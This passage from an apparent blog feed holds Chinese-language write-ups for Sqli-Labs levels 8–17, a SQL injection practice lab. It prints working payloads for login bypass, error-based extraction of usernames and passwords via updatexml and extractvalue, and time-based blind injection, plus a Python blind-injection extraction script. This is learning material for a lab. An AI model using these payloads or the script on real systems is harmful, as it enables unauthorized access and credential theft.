<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h1><p>这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=新密码 where username=账号；</div></pre></td></tr></table></figure></p>
<p>我们post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>则发现有报错回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>为单引号，所以可以推测语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;；</div></pre></td></tr></table></figure></p>
<p>接下去进行报错注入。</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>(以上来自<a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">学习笔记 UpdateXml() MYSQL显错注入</a>)</p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>可以获取数据库名为：security。</p>
<p>但要获取数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>却会显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</div></pre></td></tr></table></figure></p>
<p>也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。</p>
<p>这个可以先新建一张表，然后再在这个新建的临时表中进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这在sql.log中的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>其中<code>(select * from users)tmp</code>新建了一张tmp表，外面的<code>SELECT...FROM..</code>是从tmp中获取数据。</p>
<p>updatexml有长度限制,最长32位</p>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>得到数据库名称为 security</p>
<p>查字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>获取账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>对应的后端查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>extractvalue也有长度限制,最长32位</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://static.hx99.net/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-17 POST-Update Query-Error Based-String&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less15~16-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/</id>
    <published>2017-08-23T09:42:39.000Z</published>
    <updated>2017-08-23T10:16:14.267Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-15 POST- Blind-Boolian/time Based -Single quotes<br>Less-16 POST- Blind-Boolian/time Based -Double quotes<br><a id="more"></a></p>
<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h1><p>这关是盲注。没有回显。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。</p>
<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h1><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>登陆成功。</p>
<p>之后根据页面的登陆与否，构造逻辑语句利用脚本注入。</p>
<p>下面给个基于Less 16的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-16/index.php"</span></div><div class="line">	data = <span class="string">"uname="</span> + payload + <span class="string">"&amp;passwd=chybeta&amp;submit=Submit"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	content = requests.post(url,data=data,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"flag.jpg"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">'admin") and%09(%09select%09ascii(substr('</span> +generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/10.png?raw=true" alt=""></p>
<p>注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-15 POST- Blind-Boolian/time Based -Single quotes&lt;br&gt;Less-16 POST- Blind-Boolian/time Based -Double quotes&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less13~14-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/</id>
    <published>2017-08-23T09:23:54.000Z</published>
    <updated>2017-08-23T10:05:51.899Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-13 POST- Double Injection -Single quotes -String-with twist<br>Less-14 POST- Double Injection -Single quotes -String-with twist<br><a id="more"></a></p>
<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>说明有括号保护，需闭合。</p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less 14"></a>Less 14</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>从以上几条语句知道，需要闭合双引号。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-13 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;Less-14 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less11~12-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/</id>
    <published>2017-08-23T08:47:48.000Z</published>
    <updated>2017-08-23T10:05:52.704Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-11 POST-Error Based -Single quotes- String<br>Less-12 POST - Error Based -Double quotes - String<br><a id="more"></a><br>考察post注入，所以要借助工具。比如burp。</p>
<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h1><p>当post的数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>用如下payload即可登陆成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这样后台的语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h1><p>和Less 11差不多，将单引号换成双引号。</p>
<p>post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>发现有括号保护。</p>
<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less8~10-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
    <published>2017-08-23T07:58:33.000Z</published>
    <updated>2017-08-23T08:32:00.539Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
<p>发现有 字符串<code>You are in...........</code></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
<p>即可根据二分法得到数据库名称。</p>
<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
<p>之后利用脚本即可获取数据库名称。</p>
<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-XSS-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/"/>
